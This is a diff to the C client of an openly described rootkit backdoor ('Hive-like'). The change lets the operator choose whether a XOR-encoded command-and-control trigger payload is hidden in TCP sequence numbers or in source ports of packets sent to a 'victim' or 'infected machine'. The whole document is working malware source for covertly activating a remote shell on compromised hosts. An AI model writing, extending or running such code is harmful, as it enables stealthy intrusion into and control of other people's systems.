@@ -311,17 +311,31 @@ void hook_control_command(char* argv, int mode){
 }
 
 //Rootkit backdoor V3 being used - Hive-like
-void activate_command_control_shell_encrypted_multi_packet(char* argv){
+void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
     printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
     
     //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
-    stream_t stream = build_standard_packet_stream_empty_payload(CC_STREAM_TRIGGER_PAYLOAD_LEN/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES, 8500, 9000, local_ip, argv);
-    char *payload = calloc(CC_STREAM_TRIGGER_PAYLOAD_LEN, sizeof(char));
+    //OR stream of 6 packets, 2 bytes each
+    //Decide depending on selected mode
+    int PAYLOAD_LEN, PACKET_CAPACITY;
+    if(mode == CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM){
+        PAYLOAD_LEN = CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM;
+        PACKET_CAPACITY = CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM;
+    }else if(mode== CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT){
+        PAYLOAD_LEN = CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT;
+        PACKET_CAPACITY = CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT;
+    }else{
+        printf("["KRED"ERROR"RESET"]""An error occured with the selected mode of payload injection");
+        return;
+    }
+
+    stream_t stream = build_standard_packet_stream_empty_payload(PAYLOAD_LEN/PACKET_CAPACITY, 8500, 9000, local_ip, argv);
+    char *payload = calloc(PAYLOAD_LEN, sizeof(char));
     srand(time(NULL));
-    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+    for(int ii=0; ii<PAYLOAD_LEN; ii++){
         payload[ii] = (char)rand();
     }
     inet_pton(AF_INET, argv, (void*)(payload+0x01));
@@ -333,28 +347,23 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
         result[ii] = payload[0x05+ii] ^ key[ii];
         printf("R:%x, P5:%x, K3:%x\n", result[ii], payload[0x05+ii], key[ii]);
     }
-    printf("Payload before XOR: ");
-    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
-        printf("%x ", payload[ii]);
-    }
-    printf("\n");
     memcpy(payload+0x08, result, 0x02);
     char* payload_p = payload;
     uint16_t crc = crc16(payload_p, 10);
     memcpy(payload+0x0A, (char*)&crc, 0x02);
     printf("Payload before XOR: ");
-    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+    for(int ii=0; ii<PAYLOAD_LEN; ii++){
         printf("%x ", payload[ii]);
     }
     printf("\n");
     //Rolling xor
-    for(int ii=1; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+    for(int ii=1; ii<PAYLOAD_LEN; ii++){
         char xor_res = payload[ii-1] ^ payload[ii];
         memcpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
     printf("Payload after XOR: ");
-    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+    for(int ii=0; ii<PAYLOAD_LEN; ii++){
         printf("%x ", payload[ii]);
     }
     printf("\n");
@@ -364,7 +373,11 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
         set_TCP_flags(*(stream.packet_stream+ii*(sizeof(packet_t))), 0x02);
     }
     //Injecting payload in the stream
-    stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, CC_STREAM_TRIGGER_PAYLOAD_LEN);
+    if(mode==CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM){
+        stream_inject(stream, TYPE_TCP_SEQ_RAW, payload, PAYLOAD_LEN);
+    }else if(mode==CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT){
+        stream_inject(stream, TYPE_TCP_SRC_PORT, payload, PAYLOAD_LEN);
+    }
 
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious stream of packets with the hidden payload
@@ -464,7 +477,22 @@ void main(int argc, char* argv[]){
             printf("["KBLU"INFO"RESET"]""Activating COMMAND & CONTROL with MULTI-PACKET backdoor trigger\n");
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
-            activate_command_control_shell_encrypted_multi_packet(dest_address);
+            char buf[BUFSIZ];
+            int mode = -1;
+            while(mode<0){
+                printf(">> Where to hide the payload? Select a number: \n\t1. SEQNUM\n\t2. SRCPORT\nOption: ");                                                                                                                                                              
+                fgets(buf, BUFSIZ, stdin);
+                if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
+                    buf[strlen(buf)-1] = '\0';   
+                }
+                if(strncmp(buf, "1", 6)==0){
+                    mode = CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM;
+                }else if(strncmp(buf, "2", 7)==0){
+                    mode = CLIENT_MULTI_PACKET_TRIGGER_MODE_SRC_PORT;
+                }
+            }
+
+            activate_command_control_shell_encrypted_multi_packet(dest_address, mode);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
